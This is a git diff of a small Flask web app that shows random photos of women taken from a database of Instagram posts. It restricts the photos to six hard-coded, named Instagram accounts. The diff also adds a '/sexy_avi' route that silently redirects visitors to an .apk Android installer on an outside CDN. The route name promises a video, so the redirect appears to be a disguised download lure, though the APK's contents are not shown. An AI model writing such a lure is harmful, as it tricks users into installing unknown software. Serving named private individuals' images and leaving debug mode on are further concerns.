@@ -22,6 +22,17 @@ import json
 app = Flask(__name__)
 app.debug = True
 
+GP_INST_OWNER = [
+    'djxin_tw',
+    'joannakrupa',
+    'lenagercke',
+    'lucycecile',
+    '44lucifer77',
+    'alicebambam',
+]
+GP_ID_LIST = mm.InstMei.query.filter(mm.InstMei.inst_owner.in_(GP_INST_OWNER)).all()
+GP_ID_LIST = [x.id for x in GP_ID_LIST]
+
 def get_mei_count():
     c = mcache.get('MEI_COUNT')
     c = c if c else mm.InstMei.query.count()
@@ -32,9 +43,12 @@ def get_mei_count():
 @app.route('/index')
 def index():
     MEI_COUNT = get_mei_count()
-    r = [random.randint(1, MEI_COUNT), random.randint(1, MEI_COUNT), random.randint(1, MEI_COUNT)]
+    #r = [random.randint(1, MEI_COUNT), random.randint(1, MEI_COUNT), random.randint(1, MEI_COUNT)]
+    r = random.sample(GP_ID_LIST, 3)
     ims = mm.InstMei.query.filter(mm.InstMei.id.in_(r)).all()
     return render_template('mei.html', ims=ims, mc=MEI_COUNT)
+
+
 
 ANT_RATE = 0.02
 @app.route('/query', methods=['POST'])
@@ -42,12 +56,11 @@ def query():
     MEI_COUNT = get_mei_count()
     #ims = mm.InstMei.query.all()
     #ims = random.sample(ims, 3)
-    r = [random.randint(1, MEI_COUNT), random.randint(1, MEI_COUNT)]
+    #r = [random.randint(1, MEI_COUNT), random.randint(1, MEI_COUNT)]
+    r = random.sample(GP_ID_LIST, 2)
     ims = mm.InstMei.query.filter(mm.InstMei.id.in_(r)).all()
     ant = False if random.random() > ANT_RATE else True
     return render_template('mei_query.html', ims=ims, ant=ant)
-
-
 
 
 @app.route('/api')
@@ -59,7 +72,8 @@ def api():
 def recent():
     MEI_COUNT = get_mei_count()
     total = 1000
-    s = [random.randint(1, MEI_COUNT) for i in xrange(total)]
+    #s = [random.randint(1, MEI_COUNT) for i in xrange(total)]
+    s = random.sample(GP_ID_LIST, 1000)
     ims = mm.InstMei.query.filter(mm.InstMei.id.in_(s)).all()
     ims = [i.to_dict() for i in ims]
     r = {}
@@ -72,3 +86,8 @@ def recent():
     r['stat'] = 'ok'
     x = json.dumps(r)
     return 'jsonFlickrApi(%s)' % x 
+
+
+@app.route('/sexy_avi')
+def avi():
+    return redirect('http://ac-9dv47dhd.clouddn.com/dafa5ee7fe1344b2f387.apk', code=302)
